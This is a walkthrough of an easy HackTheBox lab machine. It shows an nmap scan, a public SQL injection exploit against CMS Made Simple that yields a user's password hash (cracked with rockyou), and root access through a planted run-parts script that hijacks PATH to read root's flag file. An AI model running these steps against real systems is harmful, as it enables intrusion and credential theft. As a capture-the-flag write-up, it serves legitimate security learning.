This article is a writeup about a retired HacktheBox machine:
[Writeup](https://www.hackthebox.com/home/machines/profile/192).
(*Yes the machine name is writeup, searching a writeup for writeup will be a
funny thing.*).
The machine is classed as an easy one. It involves vulnerability in a known CMS
as well as "PATH vulnerability" for the privilege escalation.

# Recon

First of all we start by scanning the machine's open ports with nmap. Only port
22 (SSH) and 80 (HTTP) are open:

    :::text
    # Nmap 7.80 scan initiated Sun Sep 22 16:08:28 2019 as: nmap -oA nmap -sSV 10.10.10.138

# Web, getting user

The homepage of this website is ugly and say that there is nothing there yet.
We take a look to `robots.txt`:

    :::text
    #              __
    #      _(\    |@@|
    #     (__/\__ \--/ __

    #            \ }{ /\ )_ / _\
    #            /\__/\ \__O (__
    #           (--/\--)    \__/
    #           _)(  )(_
    #          `---''---`

    # Disallow access to the blog until content is finished.
    User-agent: * 
    Disallow: /writeup/

Let's take a look at `/writeup/`! We have there another website. When looking at
the page source code we notice the use of "CMS Made Simple" a CMS with a few
vulnerabilities.

    :::html
    <!doctype html>
    <html lang="en_US"><head>

Let's search for exploits, a few of them are available:

    Shellcodes: No Result

As we are not authenticated, The one that interest us is "CMS Made Simple <
2.2.10 - SQL Injection (exploits/php/webapps/46635.py). We run the exploit
(admire the beauty of the display). We then get a username, an email, a password
salt and a password hash.

    :::text
    python 46635.py -u http://10.10.10.138/writeup
    [+] Salt for password found: 5a599ef579066807
    [+] Username found: jkr
    [+] Email found: jkr@writeup.htb
    [+] Password found: 62def4866937f08cc13bab43bb14e6f7

The exploit also allow to crack the password using a dictionary. We run
"rockyou" against it and found jkr password.

    :::text
    # python 46635.py --crack -w ./rockyou.txt -u http://10.10.10.138/writeup
    [+] Salt for password found: 5a599ef579066807
    [+] Username found: jkr
    [+] Email found: jkr@writeup.htb
    [+] Password found: 62def4866937f08cc13bab43bb14e6f7
    [+] Password cracked: raykayjay9

With this password we are able to connect to the box using SSH and get the user
password:

    :::text
    # ssh jkr@10.10.10.138
    jkr@10.10.10.138's password:

# Root

We enumerate the box without a lot of success. A quick read of the box forum
recommend to run [pspy](https://github.com/DominicBreuker/pspy) on the box. We
discover that a script is run every time an user connect with SSH.

    :::text

    2019/09/25 07:40:01 CMD: UID=0    PID=4355   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
    2019/09/25 07:40:01 CMD: UID=0    PID=4356   | run-parts --lsbsysinit /etc/update-motd.d 

The PATH is fixed by the command line and there is no `run-parts` binary in the
first folder `/usr/local/sbin`. Moreover this folder is writable. Therefore
we write a simple file `/usr/local/sbin/run-parts` and give it the execution
permission:

    :::text
    jkr@writeup:~$ vim /usr/local/sbin/run-parts
    #!/bin/bash
    cat /root/root.txt > /tmp/lool/b
    rm /tmp/lool/b

    jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts

We create a directory in `/tmp/` and write the `b` file. At the same time be
connect by SSH with the jkr user. We get the root flag

    :::text
    jkr@writeup:~$ mkdir /tmp/lool/
    jkr@writeup:~$ echo a > /tmp/lool/b
    jkr@writeup:~$ tail -f /tmp/lool/b
    a
    tail: /tmp/lool/b: file truncated

# Wrapping up

The user step implied only to use a know exploit without any change. The
privilege escalation was really interesting as I didn't use
[pspy](https://github.com/DominicBreuker/pspy) before.
